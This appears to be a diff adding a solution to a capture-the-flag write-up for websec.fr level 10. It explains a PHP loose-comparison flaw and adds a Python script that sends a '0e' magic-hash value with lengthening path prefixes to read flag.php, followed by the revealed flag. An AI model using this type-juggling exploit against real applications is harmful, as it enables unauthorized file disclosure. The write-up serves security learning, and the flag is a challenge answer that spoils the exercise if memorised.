@@ -17,5 +17,22 @@ if (isset ($_REQUEST['f']) && isset ($_REQUEST['hash'])) {
 ?>
 ```
 + So, we need to bypass the check `if($request==hash)`. 
-+ Anither thing to notice it is using loose comparison, so now it is easy to bypass
-+ 
++ Another thing to notice it is using loose comparison, so now it is easy to bypass
+We can use the following script to get the flag:
+```
+import requests
+
+prefix = "./"
+while True:
+    r = requests.post("http://websec.fr/level10/index.php", data={
+        'hash': "0e12345",
+        'f': prefix + 'flag.php'
+    })
+
+    if "WEBSEC{" in r.text:
+        print(r.text)
+        break
+
+    prefix += "/"
+```
+Flag:WEBSEC{Lose_typ1ng_system_are_super_great_aren't_them?}
